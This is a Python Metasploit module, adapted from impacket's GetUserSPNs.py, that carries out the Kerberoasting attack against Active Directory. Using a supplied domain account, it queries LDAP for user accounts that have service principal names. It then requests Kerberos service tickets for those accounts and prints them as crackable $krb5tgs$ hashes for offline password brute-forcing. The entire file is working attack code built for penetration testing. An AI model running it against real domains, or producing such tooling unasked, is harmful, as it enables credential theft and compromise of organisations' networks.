#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import os
from datetime import datetime
from binascii import hexlify, unhexlify

# extra modules
dependencies_missing = False
try:
    from pyasn1.codec.der import decoder
    from impacket import version
    from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_NORMAL_ACCOUNT
    from impacket.examples import logger
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import TGS_REP
    from impacket.krb5.ccache import CCache
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5.types import Principal
    from impacket.ldap import ldap, ldapasn1
    from impacket.smbconnection import SMBConnection
    from impacket.ntlm import compute_lmhash, compute_nthash
except ImportError:
    dependencies_missing = True

from metasploit import module

metadata = {
    'name': 'Gather Ticket Granting Service (TGS) tickets for User Service Principal Names (SPN)',
    'description': '''
        This module will try to find Service Principal Names that are associated with normal user accounts.
        Since normal accounts' passwords tend to be shorter than machine accounts, and knowing that a TGS request
        will encrypt the ticket with the account the SPN is running under, this could be used for an offline
        bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.
        This is part of the kerberoast attack research by Tim Medin (@timmedin).
    ''',
    'authors': [
        'Alberto Solino', # impacket example
        'Jacob Robles'    # Metasploit module conversion
    ],
    'date': '2014-09-27',
    'license': 'CORE_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py'},
        {'type': 'url', 'ref': 'https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf'}
    ],
    'type': 'single_scanner',
    'options': {
        'rhost': {'type': 'address', 'description': 'The target address', 'required': True, 'default': None},
        'domain': {'type': 'string', 'description': 'The target Active Directory domain', 'required': True, 'default': None},
        'user': {'type': 'string', 'description': 'Username for a domain account', 'required': True, 'default': None},
        'pass': {'type': 'string', 'description': 'Password for the domain user account', 'required': True, 'default': None}
    },
    'notes': {
        'AKA': [
            'GetUserSPNs.py',
            'Kerberoast'
        ]
    }}

class GetUserSPNs:
    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        module.log('{}'.format(outputFormat.format(*header)), level='good')
        module.log('{}'.format('  '.join(['-' * itemLen for itemLen in colLen])), level='good')

        # And now the rows
        for row in items:
            module.log('{}'.format(outputFormat.format(*row)), level='good')

    def __init__(self, username, password, domain, cmdLineOptions):
        self.options = cmdLineOptions
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__outputFileName = None  #options.outputfile
        self.__aesKey = None          #cmdLineOptions.aesKey
        self.__doKerberos = False     #cmdLineOptions.k
        self.__target = None
        self.__requestTGS = True      #options.request
        self.__kdcHost = cmdLineOptions['dc_ip']
        self.__saveTGS = False        #cmdLineOptions.save
        self.__requestUser = None #cmdLineOptions.request_user
        #if cmdLineOptions.hashes is not None:
        #    self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        # Create the baseDN
        domainParts = self.__domain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]

    def getMachineName(self):
        if self.__kdcHost is not None:
            s = SMBConnection(self.__kdcHost, self.__kdcHost)
        else:
            s = SMBConnection(self.__domain, self.__domain)
        try:
            s.login('', '')
        except Exception:
            if s.getServerName() == '':
                raise Exception('Error while anonymous logging into %s' % self.__domain)
        else:
            s.logoff()
        return s.getServerName()

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT(self):
        try:
            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
        except:
            pass
        else:
            domain = self.__domain
            principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
            creds = ccache.getCredential(principal)
            if creds is not None:
                TGT = creds.toTGT()
                module.log('Using TGT from cache', level='debug')
                return TGT
            else:
                module.log('No valid credentials found in cache', level='debug')

        # No TGT in cache, request it
        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
        # cleartext password.
        # If no clear text password is provided, we just go with the defaults.
        try:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
                                                            compute_lmhash(password),
                                                            compute_nthash(password), self.__aesKey,
                                                            kdcHost=self.__kdcHost)
        except Exception as e:
            module.log('Exception for getKerberosTGT', level='error')
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                unhexlify(self.__lmhash),
                                                                unhexlify(self.__nthash), self.__aesKey,
                                                                kdcHost=self.__kdcHost)

        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey
        return TGT

    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, spn):
        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

        # According to RFC4757 the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][:16])),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][16:])))
            module.log('{}'.format(entry), level='good')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][:16])),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][16:])))
            module.log('{}'.format(entry), level='good')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][:16])),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][16:])))
            module.log('{}'.format(entry), level='good')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][:16])),
                hexlify(str(decodedTGS['ticket']['enc-part']['cipher'][16:])))
            module.log('{}'.format(entry), level='good')
        else:
            pass


    def run(self):
        self.__target = self.__kdcHost

        # Connect to LDAP
        try:
            ldapConnection = ldap.LDAPConnection('ldap://%s'%self.__target, self.baseDN, self.__kdcHost)
            ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                ldapConnection = ldap.LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcHost)
                ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                raise

        # Building the search filter
        searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" \
                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"

        try:
            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['servicePrincipalName', 'sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         sizeLimit=999)
        except ldap.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                module.log('sizeLimitExceeded exception caught, giving up and processing the data received', level='debug')
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
            else:
                raise

        answers = []
        module.log('Total of records returned {}'.format(len(resp)), level='info')

        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            try:
                for attribute in item['attributes']:
                    if attribute['type'] == 'sAMAccountName':
                        if str(attribute['vals'][0]).endswith('$') is False:
                            # User Account
                            sAMAccountName = str(attribute['vals'][0])
                            mustCommit = True
                    elif attribute['type'] == 'userAccountControl':
                        userAccountControl = str(attribute['vals'][0])
                    elif attribute['type'] == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif attribute['type'] == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif attribute['type'] == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif attribute['type'] == 'servicePrincipalName':
                        for spn in attribute['vals']:
                            SPNs.append(str(spn))

                if mustCommit is True:
                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
                        module.log('Bypassing disabled account {}'.format(sAMAccountName), level='debug')
                    else:
                        for spn in SPNs:
                            answers.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon])
            except Exception as e:
                module.log('Skipping item, cannot process due to error', level='error')

        if len(answers)>0:
            self.printTable(answers, header=["ServicePrincipalName", "Name", "MemberOf", "PasswordLastSet", "LastLogon"])

            if self.__requestTGS is True:
                # Let's get unique user names and a SPN to request a TGS for
                users = dict( (vals[1], vals[0]) for vals in answers)

                # Get a TGT for the current user
                TGT = self.getTGT()
                for user, SPN in users.items():
                    try:
                        serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain,
                                                                                self.__kdcHost,
                                                                                TGT['KDC_REP'], TGT['cipher'],
                                                                                TGT['sessionKey'])
                        self.outputTGS(tgs, oldSessionKey, sessionKey, user, SPN)
                    except Exception as e:
                        module.log('SPN Exception: {} - {}'.format(SPN, str(e)), level='error')

        else:
            module.log('No entries found!', level='info')


def run(args):
    if dependencies_missing:
        module.log('Module dependencies (impacket, pyasn1, pyOpenSSL) missing, cannot continue', level='error')
        return

    options = {}
    options['dc_ip'] = args['rhost']
    executer = GetUserSPNs(args['user'], args['pass'], args['domain'], options)
    executer.run()

if __name__ == '__main__':
    module.run(metadata, run)
